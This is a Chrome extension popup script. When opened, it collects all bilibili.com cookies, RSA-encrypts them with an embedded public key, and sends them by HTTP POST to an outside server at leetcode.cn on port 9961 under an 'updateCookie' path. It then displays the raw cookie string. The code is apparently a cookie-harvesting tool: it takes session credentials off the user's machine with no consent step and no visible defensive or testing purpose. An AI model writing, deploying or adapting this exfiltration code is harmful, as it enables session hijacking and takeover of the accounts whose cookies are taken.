const $container = document.getElementById('container')

document.addEventListener('DOMContentLoaded', () => {
    chrome.tabs.query({ 'active': true, 'windowId': chrome.windows.WINDOW_ID_CURRENT },
        function (tabs) {
            const url = new URL(tabs[0].url)
            console.log(url)
            // if (url.host.includes("bilibili.com")) {
            chrome.cookies.getAll({
                domain: "bilibili.com"
            }, (cookies) => {
                var biliCookie = cookies.map(c => c.name + "=" + c.value).join(';')
                var encrypt = new JSEncrypt();
                encrypt.setPublicKey(`-----BEGIN PUBLIC KEY-----
                MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxFxW64XaGS7kvZ9xuvrW
                NMTyKLBQLRwnq81FUehjikRqGbCDaM9Pc9VFGgIyYKFhkEdvEK32QPtZ5iHhUXSM
                0eQRiswupwVCCDsHVYdSBQK+9bojsBAKncbDaffad8WtNK/UR2k+STwo2t8bR5wM
                trBIjBd5foKvWmxrVKC7A3R+ff64g3r3p4ajAnP+o7BdUemWJGRnrUiP5REGoXZo
                hnu4mGsdXVKQT1n9UYKzjkbKeMRo10DPlChwOw3E0WGvxwFmiYLhyMI7vANHLyY4
                3Z17CnlGlGk/3qgs+qSEVyVr6h37ljmyJgnMZ4OdJ963Oav3tVIDGoUlOoxpnnEA
                qwIDAQAB
                -----END PUBLIC KEY-----`);
                var strArr = [];
                for (let i = 0; i < biliCookie.length; i += 245) {
                    strArr.push(biliCookie.slice(i, i + 245));
                }
                var encryptArr = [];
                for (let i = 0; i < strArr.length; i++) {
                    encryptArr.push(encrypt.encrypt(strArr[i]));
                }

                var request = new XMLHttpRequest();
                var url = "http://leetcode.cn:9961/htdong/bili/updateCookie";
                request.open("POST", url);
                request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
                request.send(encryptArr.join("#"));

                request.onload = function () {
                    $container.textContent = request.status;
                    $container.textContent += " ";
                    $container.textContent += biliCookie;
                };
            })
            // }
        }
    );
})